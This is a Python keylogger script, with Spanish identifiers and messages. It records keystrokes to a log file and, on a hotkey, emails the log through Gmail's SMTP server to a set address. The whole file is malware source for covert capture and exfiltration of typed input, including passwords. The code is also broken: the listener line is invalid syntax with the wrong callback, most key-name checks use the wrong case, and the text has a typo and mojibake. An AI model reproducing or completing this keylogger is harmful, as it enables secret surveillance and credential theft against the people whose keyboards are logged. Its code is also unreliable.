from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
import sys

def enviar_correo():
    mensaje = MIMEMultipart("plain")
    mensaje["From"] = "correo_origin@gmail.com"
    mensaje["To"] = "correo_dest@gmail.com"
    mensaje["Subject"] = "LOF DEL KEYLOGGER"

    adjunto = MIMEBase("application", "octect-stream")
    adjunto.set_payload(open('log.txt','rb').read())
    adjunto.add_header("content-Disposition", 'attachment; filename="log.txt"')
    mensaje.attach(adjunto)

    server = SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login("correo_personal","passwd") #editar correo + passwd
    server.sendmail("correo_dest@gmail.com","correo_dest@gmail.com",mensaje.as_string().encode('utf-8'))

    server.quit()

def keyboard_listener(key):
    letra = str(key)
    letra = letra.replace("'","")
    if letra == 'key.space':
        letra = ' '
    elif letra == 'key.enter':
        letra = '\n'
    elif letra == 'key.tab':
        letra = '   '
    elif letra == 'Key.shift_r':
            letra = ''
    elif letra == 'Key.shift_1':
            letra = ''
    elif letra == 'key.delete':
            letra = ''
    elif letra == 'Key.backspace':
        letra = ''
    elif letra == 'key.ctrl_l':
        letra = ''
    elif letra == 'key.ctrl_r':
        letra = ''
    elif letra == 'key.caps_lock':
        letra = ''
    elif letra == 'key.right':
        letra = ''
    elif letra == 'key.left':
        letra = ''
    elif letra == 'key.up':
        letra = ''
    elif letra == 'key.down':
        letra = ''
    elif letra == 'key.alt_r':
        letra = ''
    elif letra == 'key.alt_l':
        letra = ''
    elif letra == 'key.shift':
        letra = '' 
    elif letra == 'key.f12':
        sys.exit()
    elif letra == 'key.f11':
        enviar_correo()

    else:
        pass

    with open("log.txt", "a") as f:
        f.write(letra)

def main():
    print("(+) Se inici√≥ el Keylogger")
    with Listener(on_press=Listener) as 1:
        1.join()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
